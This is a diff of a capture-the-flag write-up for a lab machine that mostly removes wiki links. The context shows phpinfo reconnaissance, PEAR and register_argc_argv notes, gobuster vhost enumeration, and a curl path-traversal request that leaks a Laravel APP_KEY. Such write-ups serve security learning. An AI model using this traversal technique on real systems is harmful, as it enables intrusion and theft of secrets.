@@ -89,7 +89,7 @@ This means there's a `phpinfo()` page exposed somewhere. I tried `http://pteroda
 Key findings were: 
 - **DOCUMENT_ROOT:** `/var/www/html`
 - **SCRIPT_FILENAME:** `/var/www/html/phpinfo.php`
-- **include_path:** `/usr/share/php/PEAR` ← [PEAR](../../1-General/3-Languages/PHP/PEAR.md) is accessible!
+- **include_path:** `/usr/share/php/PEAR` ← PEAR is accessible!
 >[!NOTE]
 > **What is PEAR?** 
 >PEAR (PHP Extension and Application Repository) is like a package manager for PHP — similar to `pt` for Linux or `pip` for Python. It comes with a script called `pearcmd.php` that manages packages.
@@ -107,7 +107,7 @@ php script.php arg1 arg2
 
 >[!NOTE] 
 >**register_argc_argv**
-[register_argc_argv](../../1-General/3-Languages/PHP/register_argc_argv) is a PHP setting that when turned **On**, makes PHP also accept arguments passed via the **URL query string** and treat them as if they were command line arguments.
+register_argc_argv is a PHP setting that when turned **On**, makes PHP also accept arguments passed via the **URL query string** and treat them as if they were command line arguments.
 
 We saw in **phpinfo** that it was **On** — meaning we can pass "command line arguments" to *PHP scripts* through the URL.
 
@@ -131,7 +131,7 @@ Trying to use the payload from *searchsploit* proves **unsuccessful**:
 Not vulnerable
 ```
 
-Through [Vhost enumeration](../../1-General/1-Recon/Enumeration/Gobuster/Vhost%20enumeration.md):
+Through Vhost enumeration:
 
 ```shell
 └─$ gobuster vhost -u http://pterodactyl.htb -w /usr/share/wordlists/dirb/common.txt --append-domain
@@ -158,7 +158,7 @@ Progress: 4613 / 4613 (100.00%)
 
 ```
 
-*panel.pterodactyl.htb Status: 200 [Size: 1897]*
+*panel.pterodactyl.htb Status: 200 (Size: 1897)*
 We've discovered another subdomain.
 
 Most likely an admin control panel. We can access it after adding it to */etc/hosts* under the same machine IP as **pterodactyl.htb**
@@ -229,7 +229,7 @@ curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodact
 ----------{SNIP}----------
 ```
 
-We got the APP_KEY (else known as [Laravel Key](../../1-General/Concepts/Laravel%20Key.md): 
+We got the APP_KEY (else known as Laravel Key: 
 `base64{{UaThTPQnUjrrK61o}}+Luk7P9o4hM+gl4UiMJqcbTSThY=`
 
 ---
